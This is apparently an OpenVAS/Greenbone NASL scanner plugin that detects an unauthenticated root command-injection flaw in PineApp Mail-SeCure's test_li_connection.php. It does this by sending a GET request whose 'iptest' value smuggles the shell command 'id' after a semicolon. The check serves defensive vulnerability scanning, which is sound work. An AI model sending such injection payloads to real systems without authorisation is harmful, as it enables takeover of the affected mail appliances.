# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103748");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("PineApp Mail-SeCure 'test_li_connection.php' Remote Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61477");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-188/");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-08-06 17:22:24 +0200 (Tue, 06 Aug 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 7443);
  script_exclude_keys("Settings/disable_cgi_scanning", "PineApp/missing");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
 with root privileges in the context of the affected appliance.

 Authentication is not required to exploit this vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"Input to the 'iptest' value is not properly sanitized in
 'test_li_connection.php'");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"The remote PineApp Mail-SeCure is prone to a remote command-injection
 vulnerability.");
  script_tag(name:"affected", value:"PineApp Mail-SeCure Series.");

  script_tag(name:"qod_type", value:"remote_vul");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:7443);

resp = http_get_cache(port:port, item:"/");

if("PineApp" >!< resp) {
  set_kb_item(name:"PineApp/missing", value:TRUE);
  exit(0);
}

req = http_get(item:"/admin/test_li_connection.php?actiontest=1&idtest=" + rand_str(length:8, charset:'0123456789')  + "&iptest=127.0.0.1;id", port:port);
resp = http_keepalive_send_recv(port:port, data:req);

if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {

  security_message(port:port);
  exit(0);

}

exit(99);
